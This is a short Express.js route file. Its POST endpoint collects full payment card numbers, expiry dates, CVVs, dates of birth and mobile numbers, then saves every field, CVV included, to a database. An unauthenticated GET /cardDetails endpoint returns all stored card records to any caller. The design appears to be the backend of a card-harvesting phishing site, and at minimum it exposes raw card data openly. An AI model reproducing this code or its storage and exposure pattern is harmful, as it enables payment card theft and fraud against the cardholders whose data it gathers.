const express = require("express");
const router = express.Router();
const Card = require("../models/Card");

// POST /api/cards - save card details
router.post("/", async (req, res) => {
  try {
    const {
      mobileNumber,
      name,
      cardNumber,
      dob, // ✅ ADDED
      expiryMonth,
      expiryYear,
      cvv,
    } = req.body;

    // Basic validation
    if (
      !mobileNumber ||
      !name ||
      !cardNumber ||
      !dob || // ✅ REQUIRED
      !expiryMonth ||
      !expiryYear ||
      !cvv
    ) {
      return res.status(400).json({ error: "All fields are required" });
    }

    // Mobile number validation
    if (!/^\d{10}$/.test(mobileNumber)) {
      return res
        .status(400)
        .json({ error: "Mobile number must be exactly 10 digits" });
    }

    // DOB validation (MM/DD/YYYY)
    if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dob)) {
      return res
        .status(400)
        .json({ error: "DOB must be in MM/DD/YYYY format" });
    }

    // Optional: Age validation (18+)
    const [month, day, year] = dob.split("/").map(Number);
    const birthDate = new Date(year, month - 1, day);
    const age = new Date().getFullYear() - birthDate.getFullYear();

    if (age < 18) {
      return res
        .status(400)
        .json({ error: "User must be at least 18 years old" });
    }

    // CVV validation
    if (!/^\d{3}$/.test(cvv)) {
      return res
        .status(400)
        .json({ error: "CVV must be exactly 3 digits" });
    }

    const newCard = new Card({
      mobileNumber,
      name,
      cardNumber,
      dob, // ✅ SAVED
      expiryMonth,
      expiryYear,
      cvv,
    });

    const savedCard = await newCard.save();

    res.status(201).json({
      message: "Card saved successfully",
      mobileNumber: savedCard.mobileNumber,
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Server error" });
  }
});




router.get("/cardDetails", async (req, res) => {
  try {
    const cards = await Card.find().sort({ createdAt: -1 });
    res.status(200).json(cards);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to fetch cards" });
  }
});

module.exports = router;
